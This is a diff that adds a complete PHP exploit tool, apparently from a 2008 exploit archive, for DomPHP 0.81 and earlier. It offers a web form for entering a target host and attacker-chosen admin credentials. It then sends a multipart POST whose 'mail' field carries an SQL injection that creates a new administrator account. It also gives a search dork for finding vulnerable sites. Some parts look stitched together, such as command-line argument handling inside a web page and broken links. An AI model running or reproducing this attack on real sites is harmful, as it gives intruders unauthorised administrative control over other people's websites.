@@ -1,0 +1,340 @@
+<?php
+/*
+ *    DomPHP <= 0.81 Remote Add Administrator Exploit
+ *    c0ded by j0j0
+ *    dork: "Site créé à l'aide du CMS DomPHP"
+ *
+ *    Exploit work with CURL
+*/
+
+error_reporting(0);
+ini_set('max_execution_time', 0);
+ini_set('default_socket_timeout', 5);
+ob_implicit_flush(true);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacket($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+    $c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+    }
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+
+
+class exploit {
+    function connect($host,$port=80) {
+        echo '[*] Trying to connect to '.$host.':'.$port.'... ';
+        $fp = @fsockopen($host, $port, $errno, $errstr, 4);
+        switch($fp) {
+            case true: echo 'OK'; break;
+            case false: echo 'ERROR'; break;
+        }
+        echo '<br />'."\n";
+        return $fp;
+    }
+}
+?>
+
+<html>
+<head>
+<style type="text/css">
+body {
+    margin:3%;
+    font-size:10px;
+    color:#FFFFFF;
+    font-family:Verdana,Arial;
+    background-color:#1a1a1a;
+    text-align: center;
+}
+input {
+    background:#303030;
+    color:#FFFFFF;
+    font-family:Verdana,Arial;
+    font-size:10px;
+    vertical-align:middle;
+    border-left:1px solid #5d5d5d;
+    border-right:1px solid #121212;
+    border-bottom:1px solid #121212;
+    border-top:1px solid #5d5d5d;
+    padding: 3px;
+    margin: 2px;
+}
+input[type=text] {
+    width: 200px;
+}
+textarea {
+    background:#303030;
+    color:#FFFFFF;
+    font-family:Verdana,Arial;
+    font-size:10px;
+    vertical-align:middle;
+    border-left:1px solid #121212;
+    border-right:1px solid #5d5d5d;
+    border-bottom:1px solid #5d5d5d;
+    border-top:1px solid #121212;
+}
+table td {
+    font-size: 10px;
+    font-family: Verdana, Arial;
+}
+h3 { color: #CC0000; }
+a {
+    color: #999999;
+    text-decoration: none;
+    font-weight: bold;
+}
+#exploit {
+    font-family: Courier New, sans-ms;
+    font-size: 12px;
+    color: #00FF00;
+    width: 400px;
+    text-align: left;
+}
+</style>
+</head>
+<body>
+<h3>DomPHP <= 0.81 Remote Add Administrator Exploit<br /><br />-= c0ded by j0j0 =-</h3>
+<br />
+<center><table><tr><td><ul>
+# Download'>http://">Download DomPHP 0.81
+
+# Visit'>http://">Visit DomPHP Website
+
+</ul></td></tr></table></center>
+<br />
+<form method="post" action="domphp.php">
+<?php
+$host = isset($_POST['host']) ? $_POST['host'] : 'localhost';
+$proxy = isset($_POST['proxy']) ? $_POST['proxy'] : '';
+$path = isset($_POST['path']) ? $_POST['path'] : '/domphp/';
+$version = isset($_POST['version']) ? $_POST['version'] : '0.81';
+$newAdminUsername = isset($_POST['newAdminUsername']) ? $_POST['newAdminUsername'] : 'j0j0';
+$newAdminPassword = isset($_POST['newAdminPassword']) ? $_POST['newAdminPassword'] : 'h4ck3d';
+?>
+<center>
+<table>
+<tr>
+    <td>Host :</td>
+    <td><input name="host" type="text" value="<?php echo $host; ?>" /></td>
+</tr>
+<tr>
+    <td>Proxy* :</td>
+    <td><input name="proxy" type="text" value="<?php echo $proxy; ?>" /></td>
+</tr>
+<tr>
+    <td>Path to DomPHP :</td>
+    <td><input name="path" type="text" value="<?php echo $path; ?>" /></td>
+</tr>
+<tr>
+    <td>DomPHP Version :</td>
+    <td><input name="version" type="text" value="<?php echo $version; ?>" /></td>
+</tr>
+<tr>
+    <td>New admin username :</td>
+    <td><input name="newAdminUsername" type="text" value="<?php echo $newAdminUsername; ?>" /></td>
+</tr>
+<tr>
+    <td>New admin password :</td>
+    <td><input name="newAdminPassword" type="text" value="<?php echo $newAdminPassword; ?>" /></td>
+</tr>
+<tr>
+    <td></td>
+    <td><input name="xpl" type="submit" value="Send Exploit"></td>
+</tr>
+</table>
+<i>* : opptional</i>
+</center>
+</form>
+
+<br />
+<?php
+if($_POST['xpl']) {
+$err=0;
+foreach($_POST as $key=>$value) {
+    if(empty($value) && $key != 'proxy') {
+        echo $key .' is empty !<br />';
+        $err++;
+    }
+}
+if($err > 0) { die(); }
+extract($_POST);
+
+echo '<center>'."\n".'<div id="exploit">'."\n";
+
+while(exploit::connect($host, 80) === FALSE) {
+/* Try to connect to {$host} */
+}
+
+if(!empty($proxy)) {
+$proxyHost = parse_url($proxy, PHP_URL_HOST);
+$proxyPort = parse_url($proxy, PHP_URL_PORT);
+if(empty($proxyHost) || empty($proxyPort)) {
+    echo '[*] Bad proxy ! I won\'t use proxy to send exploit.<br />'."\n";
+    unset($proxyHost, $proxyPort);
+    $proxy = '';
+}
+else {
+    $proxyConnect = exploit::connect($proxyHost, $proxyPort);
+    if($proxyConnect === FALSE) {
+        echo '[*] Bad proxy ! I won\'t use proxy to send exploit.<br />'."\n";
+        unset($proxyHost, $proxyPort);
+        $proxy = '';
+    }
+}
+}
+
+$port=80;
+$proxy="";
+for ($i=7; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+if($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+if($version == '0.81') { $pass1 = 1000; $pass2 = 1000; }
+else {
+    $pass1 = '';
+    $pass2 = '';
+}
+
+$data.='-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="prenom"
+
+Dom
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="nom"
+
+PHP
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="mail"
+
+h4ck\', loginUtilisateur=\''.urlencode($newAdminUsername).'\', passUtilisateur=PASSWORD(\''.urlencode($newAdminPassword).'\'), statutUtilisateur=\'admin\', siteUtilisateur=\'\', urlUtilisateur=\'\', descUtilisateur=\'\', metierUtilisateur=\'\', villeUtilisateur=\'\', contact=\'1\' /*
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="newlogin"
+
+j0j0
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="pass1"
+
+'.$pass1.'
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="pass2"
+
+'.$pass2.'
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="ville"
+
+DomPHP
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="metier"
+
+hacker
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="site"
+
+google.com
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="url"
+
+http://www.google.com
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="id_utilisateur"
+
+
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="adressemail"
+
+
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="change_pass"
+
+
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="B1"
+
+Envoyer
+-----------------------------7d6224c08dc
+';
+
+$packet ="POST ".$path."/welcome/inscription.php HTTP/1.0\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Accept-Language: en\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacket($packet);
+if(strstr($html, '404 Not Found')) {
+    echo '[*] 404 not found :( (certainly the path)';
+}
+elseif(strstr($html, 'erreur.php')) {
+    echo '[*] Exploit failed :(<br />';
+}
+else {
+    echo '[*] New admin created :)<br />';
+}
+}
+
+?>
+</div>
+</center>
+</body>
+</html>
+
+# milw0rm.com [2008-01-10]
